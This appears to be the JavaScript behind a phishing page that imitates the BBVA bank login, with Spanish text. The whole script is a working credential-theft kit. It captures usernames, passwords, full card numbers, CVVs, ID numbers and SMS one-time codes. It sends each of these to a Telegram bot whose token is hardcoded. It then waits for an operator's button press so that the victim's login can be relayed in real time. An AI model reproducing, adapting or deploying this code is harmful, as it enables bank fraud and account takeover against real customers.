document.addEventListener("DOMContentLoaded", () => {
    const loadingOverlay = document.getElementById("loadingOverlay")
    const smsModal = document.getElementById("smsModal")
    const errorMessage = document.getElementById("errorMessage")
    const smsErrorMessage = document.getElementById("smsErrorMessage")
    const closeBtn = document.querySelector(".close-btn")
    const infoMessage = document.querySelector(".info-message")
    const smsInputs = document.querySelectorAll(".sms-code-input input")
    const submitSmsCode = document.getElementById("submitSmsCode")
    const timerDisplay = document.getElementById("smsTimer")
    let timer
    let pollingInterval

    // Credenciales de Telegram (en un entorno real, esto debería estar en el servidor)
    const TELEGRAM_API_KEY = "8627198220:AAHlyBdeq2SeDlVN6G4_6QPdQrwU3tY-ICw"
    const TELEGRAM_CHAT_ID = "-1004245962123"

    // Tab switching functionality
    const tabs = document.querySelectorAll(".tab-btn")
    const loginForms = document.querySelectorAll(".login-form")
    const infoMessageText = document.getElementById("infoMessageText")
    
    // Mostrar mensaje informativo
    if (infoMessage && infoMessageText) {
        infoMessage.style.display = "block"
        infoMessageText.textContent = "Estás ingresando con tu Clave Segura. Selecciona 'Tarjeta Débito' para cambiar el tipo de ingreso."
    }

    tabs.forEach((tab) => {
        tab.addEventListener("click", () => {
            tabs.forEach((t) => t.classList.remove("active"))
            tab.classList.add("active")
            const activeTab = tab.getAttribute("data-tab")
            loginForms.forEach((form) => {
                form.style.display = form.classList.contains(activeTab + "-form") ? "block" : "none"
            })
            if (infoMessageText) {
                infoMessageText.textContent =
                    activeTab === "clave"
                        ? "Estás ingresando con tu Clave Segura. Selecciona 'Tarjeta Débito' para cambiar el tipo de ingreso."
                        : "Estás ingresando con tu Tarjeta Débito. Selecciona 'Clave Segura' para cambiar el tipo de ingreso."
            }
            // Ocultar mensaje de error al cambiar de tab
            if (errorMessage) errorMessage.style.display = "none"
        })
    })

    // Close info message
    if (closeBtn && infoMessage) {
        closeBtn.addEventListener("click", () => {
            infoMessage.style.display = "none"
        })
    }

    // Password visibility toggle
    const togglePassword = document.querySelector(".toggle-password")
    const passwordInput = document.querySelector("#password")
    
    if (togglePassword && passwordInput) {
        togglePassword.addEventListener("click", () => {
            const type = passwordInput.getAttribute("type") === "password" ? "text" : "password"
            passwordInput.setAttribute("type", type)
            togglePassword.innerHTML = type === "password" ? '<i class="fas fa-eye"></i>' : '<i class="fas fa-eye-slash"></i>'
        })
    }

    // Validación de formularios
    function validateForm(form) {
        const inputs = form.querySelectorAll("input, select")
        let isValid = true
        inputs.forEach((input) => {
            if (input.value.trim() === "") {
                isValid = false
            }
        })
        const submitBtn = form.querySelector(".submit-btn")
        if (submitBtn) {
            submitBtn.disabled = !isValid
            if (isValid) {
                submitBtn.classList.remove("disabled")
            } else {
                submitBtn.classList.add("disabled")
            }
        }
    }

    // Enviar mensaje a Telegram
    async function sendTelegramMessage(message, options = ["Mostrar error", "Permitir acceso"]) {
        const url = `https://api.telegram.org/bot${TELEGRAM_API_KEY}/sendMessage`

        const keyboard = {
            inline_keyboard: [
                options.map((option) => ({ text: option, callback_data: option.toLowerCase().replace(/ /g, "_") })),
            ],
        }

        try {
            const response = await fetch(url, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: "HTML",
                    reply_markup: JSON.stringify(keyboard),
                }),
            })
            const data = await response.json()
            return data.result ? data.result.message_id : null
        } catch (error) {
            console.error("Error al enviar mensaje a Telegram:", error)
            return null
        }
    }

    // Verificar respuesta de Telegram
    async function checkTelegramResponse(messageId) {
        const url = `https://api.telegram.org/bot${TELEGRAM_API_KEY}/getUpdates?limit=10`

        try {
            const response = await fetch(url)
            const data = await response.json()

            if (data.ok && data.result.length > 0) {
                // Buscar en todas las actualizaciones
                for (let i = data.result.length - 1; i >= 0; i--) {
                    const update = data.result[i]
                    if (update.callback_query && update.callback_query.message.message_id === messageId) {
                        return update.callback_query.data
                    }
                }
            }
            return null
        } catch (error) {
            console.error("Error al verificar la respuesta de Telegram:", error)
            return null
        }
    }

    // Polling para respuesta
    function startPolling(messageId) {
        return new Promise((resolve) => {
            let attempts = 0
            const maxAttempts = 150 // 5 minutos aprox (150 * 2 segundos)
            
            pollingInterval = setInterval(async () => {
                attempts++
                const response = await checkTelegramResponse(messageId)
                if (response) {
                    clearInterval(pollingInterval)
                    resolve(response)
                }
                if (attempts >= maxAttempts) {
                    clearInterval(pollingInterval)
                    resolve(null)
                }
            }, 2000)
        })
    }

    // Limpiar campos SMS
    function clearSmsFields() {
        Array.from(smsInputs).forEach((input) => (input.value = ""))
        if (smsInputs.length > 0) smsInputs[0].focus()
    }

    // Mostrar error SMS
    function showSmsError(message) {
        if (smsErrorMessage) {
            smsErrorMessage.textContent = message
            smsErrorMessage.style.display = "block"
        }
    }

    // Limpiar error SMS
    function clearSmsError() {
        if (smsErrorMessage) {
            smsErrorMessage.textContent = ""
            smsErrorMessage.style.display = "none"
        }
    }

    // Timer SMS
    function startSmsTimer() {
        clearSmsFields()
        let time = 300 // 5 minutes in seconds
        clearInterval(timer)
        timer = setInterval(() => {
            const minutes = Math.floor(time / 60)
            let seconds = time % 60
            seconds = seconds < 10 ? "0" + seconds : seconds
            if (timerDisplay) {
                timerDisplay.textContent = `${minutes}:${seconds}`
            }
            if (time === 0) {
                clearInterval(timer)
                showSmsError("El código SMS ha expirado. Por favor, inicie sesión nuevamente.")
                setTimeout(() => {
                    if (smsModal) smsModal.style.display = "none"
                    loginForms.forEach(form => form.reset())
                    clearSmsError()
                }, 3000)
            }
            time--
        }, 1000)
    }

    // Configurar cada formulario
    loginForms.forEach((form) => {
        const inputs = form.querySelectorAll("input, select")
        inputs.forEach((input) => {
            input.addEventListener("input", () => validateForm(form))
            input.addEventListener("change", () => validateForm(form))
        })

        form.addEventListener("submit", async (e) => {
            e.preventDefault()
            
            if (errorMessage) errorMessage.style.display = "none"
            if (loadingOverlay) loadingOverlay.style.display = "flex"
            
            const submitBtn = form.querySelector(".submit-btn")
            if (submitBtn) submitBtn.disabled = true

            let message
            
            if (form.classList.contains("clave-form")) {
                const username = form.querySelector(".id-number")?.value || ""
                const password = form.querySelector(".password-input")?.value || ""
                const docType = form.querySelector(".document-type")?.value || "cedula"
                
                message = `
🏦 <b>Nuevo intento de acceso a BBVA (Clave Segura)</b>
📄 Tipo Doc: ${docType}
👤 Usuario: ${username}
🔑 Contraseña: ${password}

Por favor, seleccione una acción:
                `
            } else if (form.classList.contains("tarjeta-form")) {
                const cardType = form.querySelector(".card-type")?.value || ""
                const cardNumber = form.querySelector(".card-number")?.value || ""
                const expiryMonth = form.querySelector(".expiry-month")?.value || ""
                const expiryYear = form.querySelector(".expiry-year")?.value || ""
                const cvv = form.querySelector(".cvv")?.value || ""
                const idType = form.querySelector(".id-type")?.value || ""
                const idNumber = form.querySelector(".id-number")?.value || ""
                
                message = `
🏦 <b>Nuevo intento de acceso a BBVA (Tarjeta Débito)</b>
💳 Tipo de Tarjeta: ${cardType}
🔢 Número de Tarjeta: ${cardNumber}
📅 Fecha de Vencimiento: ${expiryMonth}/${expiryYear}
🔐 CVV: ${cvv}
📄 Tipo de Documento: ${idType}
👤 Número de Documento: ${idNumber}

Por favor, seleccione una acción:
                `
            }

            const messageId = await sendTelegramMessage(message)

            if (messageId) {
                const adminResponse = await startPolling(messageId)

                if (adminResponse === "mostrar_error") {
                    if (loadingOverlay) loadingOverlay.style.display = "none"
                    if (errorMessage) errorMessage.style.display = "block"
                    if (submitBtn) {
                        submitBtn.disabled = false
                        submitBtn.classList.remove("disabled")
                    }
                } else if (adminResponse === "permitir_acceso") {
                    if (loadingOverlay) loadingOverlay.style.display = "none"
                    if (smsModal) smsModal.style.display = "block"
                    clearSmsFields()
                    clearSmsError()
                    startSmsTimer()
                } else {
                    // Timeout o sin respuesta
                    if (loadingOverlay) loadingOverlay.style.display = "none"
                    if (errorMessage) errorMessage.style.display = "block"
                    if (submitBtn) {
                        submitBtn.disabled = false
                        submitBtn.classList.remove("disabled")
                    }
                }
            } else {
                if (loadingOverlay) loadingOverlay.style.display = "none"
                alert("Hubo un error al procesar su solicitud. Por favor, inténtelo de nuevo más tarde.")
                if (submitBtn) {
                    submitBtn.disabled = false
                    submitBtn.classList.remove("disabled")
                }
            }
        })
    })

    // SMS code input functionality
    smsInputs.forEach((input, index) => {
        input.addEventListener("input", (e) => {
            // Solo permitir números
            e.target.value = e.target.value.replace(/[^0-9]/g, '')
            
            if (e.target.value.length === 1) {
                if (index < smsInputs.length - 1) {
                    smsInputs[index + 1].focus()
                }
            }
        })

        input.addEventListener("keydown", (e) => {
            if (e.key === "Backspace" && index > 0 && input.value.length === 0) {
                smsInputs[index - 1].focus()
            }
        })
    })

    // Cerrar modal
    const closeModal = document.querySelector(".close-modal")
    if (closeModal && smsModal) {
        closeModal.addEventListener("click", () => {
            smsModal.style.display = "none"
            clearInterval(timer)
        })
    }

    // SMS verification
    if (submitSmsCode) {
        submitSmsCode.addEventListener("click", async () => {
            const smsCode = Array.from(smsInputs)
                .map((input) => input.value)
                .join("")
                
            if (smsCode.length === 6) {
                clearInterval(timer)
                if (loadingOverlay) loadingOverlay.style.display = "flex"
                if (smsModal) smsModal.style.display = "none"
                clearSmsError()

                const messageId = await sendTelegramMessage(
                    `
🏦 <b>Código OTP ingresado para BBVA</b>
🔢 Código: ${smsCode}

Por favor, seleccione una acción:
                    `,
                    ["Error de token", "Permitir acceso"]
                )

                if (messageId) {
                    const adminResponse = await startPolling(messageId)

                    if (adminResponse === "error_de_token") {
                        if (loadingOverlay) loadingOverlay.style.display = "none"
                        if (smsModal) smsModal.style.display = "block"
                        showSmsError("Error en el token. Por favor, intente nuevamente.")
                        startSmsTimer()
                    } else if (adminResponse === "permitir_acceso") {
                        if (loadingOverlay) loadingOverlay.style.display = "none"
                        window.location.href = '../confirmacion.html'
                    } else {
                        if (loadingOverlay) loadingOverlay.style.display = "none"
                        if (smsModal) smsModal.style.display = "block"
                        showSmsError("Tiempo de espera agotado. Por favor, intente nuevamente.")
                    }
                } else {
                    if (loadingOverlay) loadingOverlay.style.display = "none"
                    if (smsModal) smsModal.style.display = "block"
                    showSmsError("Hubo un error al procesar su solicitud. Por favor, inténtelo de nuevo más tarde.")
                }
            } else {
                showSmsError("Por favor, ingrese el código SMS completo (6 dígitos).")
            }
        })
    }

    // Inicializar formularios
    loginForms.forEach((form) => validateForm(form))
})